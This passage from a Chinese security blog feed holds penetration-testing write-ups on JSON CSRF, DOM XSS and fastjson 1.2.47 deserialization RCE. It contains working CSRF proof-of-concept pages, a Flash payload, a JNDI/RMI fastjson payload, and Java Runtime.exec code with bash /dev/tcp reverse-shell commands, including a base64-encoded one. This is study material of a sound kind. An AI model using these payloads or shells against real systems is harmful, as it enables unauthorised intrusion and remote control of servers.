      &lt;input type=&quot;hidden&quot; name=&quot;{&quot;app_key&quot;:&quot;******&quot;,&quot;client_id&quot;:&quot;******&quot;,&quot;summary&quot;:{&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;******&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;},&quot;custom&quot;:{}}&quot; value=&quot;&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;

</code></pre><p>请求内容如下：</p>
<pre><code>POST /get_flags_async HTTP/1.1
Host: experiment.appadhoc.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://burp/
Content-Type: text/plain
Content-Length: 554
Connection: close
Upgrade-Insecure-Requests: 1

{&quot;app_key&quot;:&quot;******&quot;,&quot;client_id&quot;:&quot;******&quot;,&quot;summary&quot;:{&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;******&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;},&quot;custom&quot;:{}}=
</code></pre><p>返回结果：json解析器并不解析，并且Content-Type为也由原本的application/json转换为text/plain类型</p>
<pre><code>HTTP/1.1 400 Bad Request
Server: nginx/1.12.2
Date: Fri, 22 Feb 2019 07:52:08 GMT
Content-Type: text/plain; charset=UTF-8
Content-Length: 77
Connection: close
Access-Control-Allow-Origin: *

The request content was malformed:
unknown token =
Near: e&quot;:&quot;&quot;},&quot;custom&quot;:{}}=
</code></pre><h4 id="服务器查找json格式的数据但不验证Content-type"><a href="#服务器查找json格式的数据但不验证Content-type" class="headerlink" title="服务器查找json格式的数据但不验证Content-type"></a>服务器查找json格式的数据但不验证Content-type</h4><p>对于服务器查找json格式的数据但不验证Content-type的情况，可以尝试以下方法(使用Content-type：text / plain来实现)：</p>
<ul>
<li>方法一 fetch api的调用<pre><code>&lt;html&gt;
&lt;title&gt;JSON CSRF POC&lt;/title&gt;
&lt;body&gt;
&lt;center&gt;
&lt;h1&gt; JSON CSRF POC &lt;/h1&gt;
&lt;script&gt;
fetch(&#39;http://vul-app.com&#39;, {method: &#39;POST&#39;, credentials: &#39;include&#39;, headers: {&#39;Content-Type&#39;: &#39;text/plain&#39;}, body: &#39;{&quot;name&quot;:&quot;attacker&quot;,&quot;email&quot;:&quot;attacker.com&quot;}&#39;});
&lt;/script&gt;
&lt;form action=&quot;#&quot;&gt;
&lt;input type=&quot;button&quot; value=&quot;Submit&quot; /&gt;
&lt;/form&gt;
&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></li>
</ul>
<ul>
<li>方法二 hackerone 上的方法<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
$( document ).ready(function() {
  $(&quot;#z&quot;).attr(&quot;name&quot;,&#39;{&quot;entity&quot;:&quot;https://zzz.com&quot;,&quot;type&quot;:&quot;domain&quot;,&quot;time&quot;:&quot;&#39;+($.now()/1000)+&#39;&quot;,&quot;project&quot;:&quot;&lt;&lt;LAST_PROJECT&gt;&gt;&quot;,&quot;is_debugging&quot;:false,&quot;plugin&quot;:&quot;chrome-wakatime/1.0.2&quot;,&quot;fakeparam&quot;:&quot;&#39;);
  $(&quot;#f&quot;).submit();
});
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form id=&quot;f&quot; ENCTYPE=&quot;text/plain&quot; action=&quot;https://api.wakatime.com/api/v1/users/current/heartbeats&quot; method=&quot;post&quot;&gt;
&lt;input id=&quot;z&quot; type=&quot;hidden&quot; name=&#39;test&#39; value=&#39;test&quot;}&#39;&gt; 
&lt;input type=&quot;submit&quot; value=&quot;send&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></li>
</ul>
<p>给value赋予一个值，构造正常的json数据包<br>形式一：用单引号构造</p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;
    &lt;form action=&quot;https://experiment.appadhoc.com/get_flags_async&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;
      &lt;input name=&#39;{&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:{&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;https://blog.csdn.net/&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;},&quot;custom&quot;:{},&quot;test&quot;:&quot;&#39; value=&#39;test&quot;}&#39; type=&#39;hidden&#39;&gt; 
      &lt;input type=submit&gt; 
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;


请求数据：
POST /get_flags_async HTTP/1.1
Host: experiment.appadhoc.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: text/plain
Content-Length: 124
Connection: close
Upgrade-Insecure-Requests: 1

{&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:{&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;*****&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;},&quot;custom&quot;:{},&quot;test&quot;:&quot;=test&quot;}

</code></pre><p>返回200</p>
<h4 id="服务器查找json格式的数据并验证Content-type，即application-json"><a href="#服务器查找json格式的数据并验证Content-type，即application-json" class="headerlink" title="服务器查找json格式的数据并验证Content-type，即application/json"></a>服务器查找json格式的数据并验证Content-type，即application/json</h4><p>但在校验Content-type的情况下，这个时候上述方法就行不不通了。这个时候可以用ajax来自定义数据头，XHRHTTPREQUEST修改Content-Type,改成application/json</p>
<pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;script&gt;
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open(&quot;POST&quot;, &quot;http://www.xxx.com/webnet/edit&quot;, true);
        xhr.setRequestHeader(&quot;Accept&quot;, &quot;*/*&quot;);
        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;);
        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json; charset=utf-8&quot;);
        xhr.withCredentials = true;
        xhr.send(JSON.stringify({&quot;pSpotId&quot;:&quot;120201&quot;,&quot;pSignTimes&quot;:&quot;70&quot;,&quot;pModuleID&quot;:&quot;207&quot;,&quot;pSceneid&quot;:&quot;120201007000046&quot;}));
    }
    &lt;/script&gt;
    &lt;form action=&quot;#&quot;&gt;
      &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot;/&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>但是这个有个缺陷，使用xmlhttprequest的时候，会先发一个OPTIONS请求预检(非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求,即浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错)，在使用XHR的时候空域状态下会有跨域限制。这里涉及到cors跨域限制的问题，详情可以看看<br>‘<a href="https://my.oschina.net/hccake/blog/886602&#39;" target="_blank" rel="noopener">https://my.oschina.net/hccake/blog/886602&#39;</a></p>
<p>预检请求：</p>
<pre><code>OPTIONS /get_flags_async HTTP/1.1
Host: experiment.appadhoc.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
Origin: null
Connection: close

</code></pre><p>其中如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。<br>报错：</p>
<pre><code>Access to XMLHttpRequest at &#39;https://experiment.appadhoc.com/get_flags_async&#39; from origin &#39;null&#39; has been blocked by CORS policy: Response to preflight request doesn&#39;t pass access control check: The value of the &#39;Access-Control-Allow-Origin&#39; header in the response must not be the wildcard &#39;*&#39; when the request&#39;s credentials mode is &#39;include&#39;. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.
</code></pre><p>服务器设置允许任意域名跨域请求与可携带cookie进行了冲突，这个问题是后端配置的问题<br>（axios默认是发送请求的时候不会带上cookie的，需要通过设置withCredentials: true来解决。 这个时候需要注意需要后端配合设置实际的origin，不能为* ）</p>
<p>遇到cors跨域请求不通过的时候flash　+ 307 跳转就可以派上用场了。</p>
<h5 id="flash-307-即SWF-JSON-CSRF-待补充"><a href="#flash-307-即SWF-JSON-CSRF-待补充" class="headerlink" title="flash + 307 即SWF_JSON_CSRF-待补充"></a>flash + 307 即SWF_JSON_CSRF-待补充</h5><p>参考 <a href="https://github.com/sp1d3r/swf_json_csrf" target="_blank" rel="noopener">https://github.com/sp1d3r/swf_json_csrf</a> </p>
<ul>
<li><p>as编辑swf文件<br>编辑修改swf文件这里我用的是ffdec<br>构造payload如下<br><code>`</code><br>package<br>{<br> import flash.display.Sprite;<br> import flash.net.URLLoader;<br> import flash.net.URLRequest;<br> import flash.net.URLRequestHeader;<br> import flash.net.URLRequestMethod;</p>
<p> public class re extends Sprite<br> {</p>
</li>
</ul>
<pre><code>  public function re()
  {
     var member1:Object = null;
     var myJson:String = null;
     Wonderfl.capture(stage);
     super();
     Wonderfl.capture(stage);
     member1 = new Object();
     member1 = {
        &quot;name&quot;:&quot;attacker&quot;,
        &quot;email&quot;:&quot;attacker@gmail.com&quot;
     };
     var myData:Object = member1;
     myJson = JSON.stringify(myData);
     myJson = JSON.stringify(myData);
     var url:String = &quot;http://xxxxx.ceye.io&quot;;
     var request:URLRequest = new URLRequest(url);
     request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));
     request.data = myJson;
     request.method = URLRequestMethod.POST;
     var urlLoader:URLLoader = new URLLoader();
     try
     {
        urlLoader.load(request);
        return;
     }
     catch(e:Error)
     {
        trace(e);
        return;
     }
  }
</code></pre><p>   }<br>}</p>
<pre><code>- php307 跳转

由于307跳转会带上原有的数据格式和类型，所以使用307跳转

如：
</code></pre><p>&lt;?php</p>
<p>// redirect automatically</p>
<p>header(“Location: <a href="https://xx.xxx.xx/xx&quot;" target="_blank" rel="noopener">https://xx.xxx.xx/xx&quot;</a>, true, 307);</p>
<p>?&gt;</p>
<pre><code># 参考
</code></pre><p><a href="http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html" target="_blank" rel="noopener">http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html</a><br><a href="https://my.oschina.net/hccake/blog/886602" target="_blank" rel="noopener">https://my.oschina.net/hccake/blog/886602</a><br><a href="https://www.freebuf.com/articles/web/164234.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/164234.html</a><br><a href="https://www.cnblogs.com/blacksunny/p/7930126.html" target="_blank" rel="noopener">https://www.cnblogs.com/blacksunny/p/7930126.html</a><br><a href="http://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/" target="_blank" rel="noopener">http://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/</a><br><a href="https://github.com/sp1d3r/swf_json_csrf" target="_blank" rel="noopener">https://github.com/sp1d3r/swf_json_csrf</a><br><a href="https://github.com/bottlepy/bottle/issues/616" target="_blank" rel="noopener">https://github.com/bottlepy/bottle/issues/616</a><br><a href="https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html</a><br><a href="https://www.csdn.net/article/2015-07-14/2825207" target="_blank" rel="noopener">https://www.csdn.net/article/2015-07-14/2825207</a><br><a href="https://book.2cto.com/201310/34316.html" target="_blank" rel="noopener">https://book.2cto.com/201310/34316.html</a><br><a href="http://blog.knownsec.com/2014/06/flashupload_csrf_attacking/" target="_blank" rel="noopener">http://blog.knownsec.com/2014/06/flashupload_csrf_attacking/</a><br><a href="http://cm2.pw/" target="_blank" rel="noopener">http://cm2.pw/</a><br><code>`</code></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="CORS与JSONP的区别-待补充"><a href="#CORS与JSONP的区别-待补充" class="headerlink" title="CORS与JSONP的区别-待补充"></a>CORS与JSONP的区别-待补充</h2><p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
]]></content>
      
        <categories>
            
            <category> Web渗透 </category>
            
            <category> 安全策略 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[DOM XSS从javascript中输出数据到HTML页面]]></title>
      <url>/2019/07/21/xss/DOM-XSS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%BB%B6%E4%BC%B8/</url>
      <content type="html"><![CDATA[<p>DOM XSS从javascript中输出数据到HTML页面</p>
<p>存储或反射型XSS是从服务端输出到HTML页面</p>
<h4 id="常见位置"><a href="#常见位置" class="headerlink" title="常见位置"></a>常见位置</h4><h5 id="URL代入页面"><a href="#URL代入页面" class="headerlink" title="URL代入页面"></a>URL代入页面</h5><p>定义：通过js直接获取url中的参数，然后输出到HTML页面</p>
<p>通过window.location.search获取页面url传递的参数</p>
<pre><code>function GetQueryString(name) {
    var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);
    var r = decodeURI(window.location.search.substr(1)).match(reg);
    if (r != null)return unescape(r[2]);
    return null;
}

var sname = GetQueryString(&quot;name&quot;);
if(sname!=null){
    var sname_ = decodeURIComponent(sname); 
    alert(sname_);
}    #获取具体参数  

document.getElementById(&#39;foo&#39;).innerHTML = getUrlParam(&#39;foo&#39;) #dom型XSS问题
</code></pre><p>此时取值时，匹配的URL是location.href，这个值包含了 location.search 和 location.hash 的值，而 location.hash 的值是不被传到服务器，但并且能被前端JS通过 getUrlParam 函数成功取值</p>
<p><strong>location.search:</strong>获取问号后面的参数<br>如：</p>
<pre><code>http://www.runoob.com/submit.htm?email=someone@ example.com
</code></pre><p>通过document.write(location.search);获取到的是</p>
<pre><code>?email=someone@example.com
</code></pre><p>location.hash:获取url的锚部分，从“#”开始到最后，都是锚部分，不被传到服务器，但并且能被前端JS通过 getUrlParam 函数成功取值。</p>
<h5 id="跳转类"><a href="#跳转类" class="headerlink" title="跳转类"></a>跳转类</h5><p>在 javascript 语法中，使用如下代码可以将页面进行跳转操作</p>
<pre><code>location.href = urlparams.redirecturl;
&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
    &lt;head&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;script&gt;
            function jump(){
                window.location.href=&quot;javascript:alert(1)&quot;;
            }
        &lt;/script&gt;
        &lt;button type=&quot;button&quot; onclick=&quot;jump()&quot;&gt;test&lt;/button&gt;
    &lt;/body&gt;
&lt;/html&gt;

附：
//顶层窗口跳转
//top.location.href=&#39;http://www.baidu.com&#39;;

//父层窗口跳转
//parent.location.href=&#39;http://www.baidu.com&#39;;


//以下均为本页面跳转

//window.location.href=&quot;http://www.baidu.com&quot;;
//location.href=&quot;http://www.baidu.com&quot;;
//self.location.href=&quot;http://www.baidu.com&quot;;
//this.location.href=&quot;http://www.baidu.com&quot;;
//location.href=&quot;http://www.baidu.com&quot;;
document.location.href
</code></pre><p>这样的跳转通常会出现在登录页、退出页、中间页。<br>如果开发者让用户可以控制 redirecturl 参数，就可以使用 javascript:alert(1) 的形式进行XSS攻击。<br>最近几年的APP开发比较热门，通过web唤起APP的操作也是越来越多，跳转的协议也是多种多样，例如 webview:// , myappbridge:// 等等。 仅仅使用 http 和 https 来判断URL是否合法已经不适用了，于是由跳转所产生的DOM-XSS漏洞也逐渐增多。</p>
<p>测试关注点 输入点</p>
<pre><code>document.location
document.URL
document.URLUnencoded
document.referrer
window.location（href hash）
所有的inputs
window.name
document.cookie
XMLhttpRequest返回的数据
localstorage

·····
</code></pre><p>以下几个地方是js输出到HTML的必经之路 输出点</p>
<pre><code>document.write()
document.writeln()
xxx.innerHTML=
xxx.outerHTML=
innerHTML.replace=
document.attachEvent()
window.attachEvent()
document.location.replace()
document.location.assign()
</code></pre><h5 id="缓存类"><a href="#缓存类" class="headerlink" title="缓存类"></a>缓存类</h5><p>开发者在缓存前端数据的时候，通常会存在 sessionStorage , localStorage , cookie 中，因为 sessionStorage 在页面刷新时就失效的特性，利用方式相对简单的只有后面两种。</p>
<h5 id="参考学习"><a href="#参考学习" class="headerlink" title="参考学习"></a>参考学习</h5><pre><code>
https://code.google.com/archive/p/domxsswiki/   domxss 备忘单
https://cstcamaro.github.io/post/2018-ISC-%E6%BC%94%E8%AE%B2%E7%A8%BF?tdsourcetag=s_pctim_aiomsg

http://blog.nsfocus.net/xss-advance/#23_DOM
</code></pre>]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
            <category> XSS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[fastjson 1.2.47 rce]]></title>
      <url>/2019/07/18/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/fastjson/</url>
      <content type="html"><![CDATA[<p>[TOC]</p>
<h1 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson 1.2.47 rce"></a>fastjson 1.2.47 rce</h1><p>在渗透测试中 发现了fastjson的有漏洞的版本，<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640447555647.jpg" alt="-w682"></p>
<p>想着尝试下</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>恶意攻击者可以构造攻击请求绕过FastJSON的黑名单策略。例如，攻击者通过精心构造的请求，远程让服务端执行指定命令</p>
<h2 id="对应payload"><a href="#对应payload" class="headerlink" title="对应payload"></a>对应payload</h2><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"x"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span>
        <span class="token property">"autoCommit"</span><span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15633821836741.jpg" alt="-w497"></p>
<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640448645384.jpg" alt="-w1093"></p>
<p>此处简单测试了利用该命令漏洞会去请求exploit。<br>这个漏洞的利用方式跟18年的fastjson反序列化漏洞比较类似，这里先看下18年的fastjson漏洞，跟着分析下</p>
<h2 id="FastJson-JdbcRowSetImpl"><a href="#FastJson-JdbcRowSetImpl" class="headerlink" title="FastJson-JdbcRowSetImpl"></a>FastJson-JdbcRowSetImpl</h2><h3 id="搭建漏洞环境"><a href="#搭建漏洞环境" class="headerlink" title="搭建漏洞环境"></a>搭建漏洞环境</h3><p>根据<a href="https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE" target="_blank" rel="noopener">FastJson-JdbcRowSetImpl</a>搭建该漏洞环境，进行测试, 该漏洞环境<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637129821308.jpg" alt="-w908"></p>
<h4 id="开启http服务"><a href="#开启http服务" class="headerlink" title="开启http服务"></a>开启http服务</h4><pre><code>Python3 -m http.server 80
</code></pre><h4 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h4><pre><code>java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar &lt;HTTP服务地址&gt; 指定RMI端口
</code></pre><h4 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h4><p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15640449119775.jpg" alt="-w1197"></p>
<p>poc 如下<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637154042668.jpg" alt="-w756"></p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span>    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
<span class="token keyword">import</span>    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommandObject</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token function">CommandObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">try</span><span class="token punctuation">{</span>
            Runtime    rt    <span class="token operator">=</span>    Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//Runtime.getRuntime().exec("bash -i >&amp; /dev/tcp/ip/8550 0>&amp;1");</span>
            <span class="token comment" spellcheck="true">//String[] commands = {"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}"};</span>

            String<span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token string">"xxxx.ceye.io"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            Process    pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"11111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        CommandObject e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CommandObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre>
<p><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637155154519.jpg" alt="-w1156"></p>
<h4 id="反弹shell-测试"><a href="#反弹shell-测试" class="headerlink" title="反弹shell 测试"></a>反弹shell 测试</h4><pre><code>String[] commands = {&quot;bash -i &gt;&amp; /dev/tcp/ip/8550 0&gt;&amp;1&quot;};
</code></pre><p>将此处直接修改为该命令，发现结果不行，直接运行该commandobject程序<br><img src="/2019/07/18/Web渗透/漏洞学习/fastjson/15637230154421.jpg" alt="-w1112"><br>结果发现是zsh 不支持，切换个,网上一堆用如下java反弹shell的写法，结果发现在1.8的jdk，一直不符合格式</p>
<pre><code>String[] commands = [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[];
</code></pre><p>修改后如下,可以反弹shell，还有其他方式暂时未试，详情看<a href="https://blog.spoock.com/2018/11/07/java-reverse-shell/" target="_blank" rel="noopener">使用java反弹shell</a></p>
<pre class=" language-java"><code class="language-java">
<span class="token keyword">import</span>    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
<span class="token keyword">import</span>    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">fastjson</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token function">fastjson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">try</span><span class="token punctuation">{</span>
            Runtime    rt    <span class="token operator">=</span>    Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
